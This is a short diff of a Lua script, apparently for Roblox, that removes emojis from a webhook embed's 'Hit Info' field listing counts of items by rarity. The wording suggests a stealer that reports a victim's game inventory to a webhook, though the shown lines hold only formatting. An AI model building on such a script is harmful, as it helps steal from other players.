@@ -1072,13 +1072,13 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "```:dart: Hit Info```", 
             value = "```Uniques: "..tostring(uniqueItemsC)..
-                     "\n(🥳) Ancients: "..tostring(ancientItemsC)..
-                     "\n(🤑) Godlys: "..tostring(godlyItemsC)..
-                     "\n(😜) Legendaries: "..tostring(legendaryItemsC)..
-                     "\n(😛) Vintage: "..tostring(vintageItemsC)..
-                     "\n(😀) Rares: "..tostring(rareItemsC)..
-                     "\n(☹️) Uncommons: "..tostring(uncommonItemsC)..
-                     "\n(😕) Commons: "..tostring(commonItemsC).."```"
+                     "\nAncients: "..tostring(ancientItemsC)..
+                     "\nGodlys: "..tostring(godlyItemsC)..
+                     "\nLegendaries: "..tostring(legendaryItemsC)..
+                     "\nVintage: "..tostring(vintageItemsC)..
+                     "\nRares: "..tostring(rareItemsC)..
+                     "\nUncommons: "..tostring(uncommonItemsC)..
+                     "\nCommons: "..tostring(commonItemsC).."```"
         },
         {
             name = "```Summary```", 
